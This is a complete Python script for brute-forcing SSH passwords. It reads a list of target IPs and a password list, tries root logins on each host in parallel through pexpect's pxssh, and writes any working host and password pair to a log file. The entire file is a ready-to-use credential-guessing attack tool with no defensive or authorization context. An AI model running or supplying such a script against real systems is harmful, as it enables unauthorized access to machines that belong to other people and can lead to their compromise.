# coding: utf-8

from pexpect import pxssh
from multiprocessing import Pool
import os

maxConnections = 5
user = 'root'
port = 22
with open('ip.txt', 'r') as f:
    hosts = [h.strip() for h in f.readlines()]
with open('pwd.txt', 'r') as f:
    password_list = [p.strip() for p in f.readlines()]


def process_task(host):
    found = False
    print('Run process task in host: %s (%s)...' % (host, os.getpid()))
    for password in password_list:
        if found:
            print("[*] Exiting: Password Found")
            return True
        print('host: %s    -----   Testing: %s' % (host, password))
        try:
            s = pxssh.pxssh()
            s.login(host, user, password, port=port)
            print('host: %s    -----   Password Found: %s' % (host, password))
            with open('log.txt', 'a') as f:
                f.write('host: %s ------ password: %s\n' % (host, password))
            found = True
        except:
            pass


if __name__ == '__main__':
    process = Pool(8)
    while len(hosts):
        process.apply_async(process_task, args=(hosts.pop(),))
    process.close()
    process.join()
    print('All subprocesses done.')
